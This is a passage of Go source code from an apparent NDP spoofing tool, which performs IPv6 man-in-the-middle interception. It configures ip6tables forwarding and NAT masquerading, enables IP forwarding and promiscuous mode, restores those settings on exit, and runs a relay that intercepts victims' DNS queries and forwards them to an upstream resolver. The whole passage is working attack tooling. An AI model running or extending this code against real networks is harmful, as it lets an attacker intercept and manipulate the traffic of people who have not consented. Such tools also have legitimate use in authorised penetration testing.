		nr.opts["promisc"] = "true"
	} else {
		nr.opts["promisc"] = "false"
	}
	cmd := fmt.Sprintf(`
ip6tables -A INPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
ip6tables -A OUTPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
ip6tables -A FORWARD -i %s -j ACCEPT
ip6tables -t nat -A POSTROUTING -o %s -j MASQUERADE
`, nr.iface.Name, nr.iface.Name)
	if err := nr.runRuleCmd(cmd); err != nil {
		return err
	}
	nr.runSysctlOptCmd("net.ipv4.ip_forward", "1")
	nr.runSysctlOptCmd("net.ipv6.conf.all.forwarding", "1")
	nr.runSysctlOptCmd("net.ipv6.conf.all.accept_ra", "0")
	nr.runSysctlOptCmd("net.ipv6.conf.all.accept_redirects", "0")
	nr.runSysctlOptCmd("fs.file-max", "100000")
	nr.runSysctlOptCmd("net.core.somaxconn", "65535")
	nr.runSysctlOptCmd("net.core.netdev_max_backlog", "65536")
	nr.runSysctlOptCmd("net.ipv4.tcp_fin_timeout", "15")
	nr.runSysctlOptCmd("net.ipv4.tcp_tw_reuse", "1")
	nr.runSysctlOptCmd("net.ipv4.tcp_max_tw_buckets", "65536")
	nr.runSysctlOptCmd("net.ipv4.tcp_window_scaling", "1")
	return nil
}

func (nr *NDPSpoofer) clearSettings() error {
	cmd := fmt.Sprintf(`
ip6tables -D INPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
ip6tables -D OUTPUT -p ipv6-icmp --icmpv6-type redirect -j DROP
ip6tables -D FORWARD -i %s -j ACCEPT
ip6tables -t nat -D POSTROUTING -o %s -j MASQUERADE
`, nr.iface.Name, nr.iface.Name)
	if err := nr.runRuleCmd(cmd); err != nil {
		return err
	}
	cmds := make([]string, 0, len(nr.opts))
	for _, cmd := range slices.Sorted(maps.Keys(nr.opts)) {
		switch cmd {
		case "promisc":
			enable, _ := strconv.ParseBool(nr.opts[cmd])
			network.SetPromiscuous(nr.iface.Name, enable)
		default:
			cmds = append(cmds, fmt.Sprintf("sysctl -w %s=%q", cmd, nr.opts[cmd]))
		}
	}
	cmdRestoreOpts := strings.Join(cmds, "\n")
	return nr.runRuleCmd(cmdRestoreOpts)
}

func (nr *NDPSpoofer) runRuleCmd(rule string) error {
	var setex string
	if nr.debug {
		setex = "set -ex"
	}
	cmd := exec.Command("bash", "-c", fmt.Sprintf(`
    %s
    %s
    `, setex, rule))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if !nr.debug {
		cmd.Stdout = nil
	}
	return cmd.Run()
}

func (nr *NDPSpoofer) runSysctlOptCmd(opt string, value string) error {
	data, err := os.ReadFile(fmt.Sprintf("/proc/sys/%s", strings.ReplaceAll(opt, ".", "/")))
	if err != nil {
		return err
	}
	var setex string
	if nr.debug {
		setex = "set -ex"
	}
	cmdOpt := fmt.Sprintf(`sysctl -w %s=%q`, opt, value)
	cmd := exec.Command("bash", "-c", fmt.Sprintf(`
    %s
    %s`, setex, cmdOpt))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if !nr.debug {
		cmd.Stdout = nil
	}
	if err := cmd.Run(); err != nil {
		return err
	}
	nr.opts[opt] = strings.ReplaceAll(strings.TrimRight(string(data), "\n"), "\t", " ")
	return nil
}

type udpConn struct {
	*net.UDPConn
	srcAddr *net.UDPAddr
	written atomic.Uint64
}

func (nr *NDPSpoofer) listenAndServeDNS(gwDNS *net.UDPAddr) {
	buf := make([]byte, udpBufferSize)
	for {
		select {
		case <-nr.quit:
			nr.wg.Done()
			return
		default:
			err := nr.gwConn.SetReadDeadline(time.Now().Add(readTimeoutUDP))
			if err != nil {
				if errors.Is(err, net.ErrClosed) {
					continue
				}
				nr.logger.Error().Err(err).Msg("[ndp spoofer] Failed setting read deadline")
				continue
			}
			n, srcAddr, er := nr.gwConn.ReadFromUDP(buf)
			if n > 0 {
				c, err := net.DialUDP("udp", nil, gwDNS)
				if err != nil {
					nr.logger.Error().Err(err).Msgf("[ndp spoofer] Failed creating UDP connection %s→ %s", srcAddr, gwDNS)
					continue
				}
				conn := &udpConn{UDPConn: c, srcAddr: srcAddr}
				nr.logger.Debug().Msgf("[ndp spoofer] New DNS connection from %s", conn.srcAddr)
				err = conn.SetWriteDeadline(time.Now().Add(writeTimeoutUDP))
				if err != nil {
					if errors.Is(err, net.ErrClosed) {
						continue
					}
					nr.logger.Error().Err(err).Msg("[ndp spoofer] Failed setting write deadline")
					continue
				}
				nw, err := conn.Write(buf[:n])
				if err != nil {
					if ne, ok := err.(net.Error); ok && ne.Timeout() {
						continue
					}
					if errors.Is(err, net.ErrClosed) {
						continue
					}
					continue
				}
				nr.wg.Add(1)
				conn.written.Add(uint64(nw))
				go nr.handleDNSConnection(conn)
			}
			if er != nil {
				if ne, ok := er.(net.Error); ok && ne.Timeout() {
					continue
				}
				if errors.Is(err, net.ErrClosed) {
					continue
				}
				if errors.Is(er, io.EOF) {
					continue
				}
				nr.logger.Error().Err(er).Msg("[ndp spoofer] Failed reading UDP message")
				continue
			}
		}
	}
}

func (nr *NDPSpoofer) handleDNSConnection(conn *udpConn) {
	defer func() {
		conn.Close()
		nr.logger.Debug().Msgf("[ndp spoofer] Copied %s for udp src: %s", network.PrettifyBytes(int64(conn.written.Load())), conn.srcAddr)
		nr.wg.Done()
	}()
	buf := make([]byte, udpBufferSize)
	er := conn.SetReadDeadline(time.Now().Add(readTimeoutUDP))
	if er != nil {
		if errors.Is(er, net.ErrClosed) {
			return
		}
		nr.logger.Debug().Err(er).Msg("[ndp spoofer] Failed setting read deadline")
		return
	}
	nread, er := conn.Read(buf)
	if nread > 0 {
		er := nr.gwConn.SetWriteDeadline(time.Now().Add(writeTimeoutUDP))
		if er != nil {
			if errors.Is(er, net.ErrClosed) {
				return
			}
			nr.logger.Debug().Err(er).Msg("[ndp spoofer] Failed setting write deadline")
			return
		}
		nw, ew := nr.gwConn.WriteToUDP(buf[0:nread], conn.srcAddr)
		if nw < 0 || nread < nw {
			nw = 0
			if ew == nil {
				ew = errInvalidWrite
			}
		}
		conn.written.Add(uint64(nw))
		if ew != nil {
			if errors.Is(ew, net.ErrClosed) {
				return
			}
			if ne, ok := ew.(net.Error); ok && ne.Timeout() {
				return
			}
		}
		if nread != nw {
			nr.logger.Debug().
				Err(io.ErrShortWrite).
				Msgf("[ndp spoofer] Failed sending message %s→ %s", conn.LocalAddr(), conn.srcAddr)
			return
		}
	}
	if er != nil {
		return
	}
}

func (nr *NDPSpoofer) getResolver() *net.UDPAddr {
	if resolvers, err := network.GetSystemNameservers(); err == nil {
		for _, r := range resolvers {
			if network.Is6(r) {
				var zone string
				if r.IsLinkLocalUnicast() {
					zone = nr.iface.Name
				}
				return &net.UDPAddr{IP: net.ParseIP(r.String()), Port: 53, Zone: zone}
			}
		}
	}
	return &net.UDPAddr{IP: net.ParseIP("2001:4860:4860::8888"), Port: 53}
}
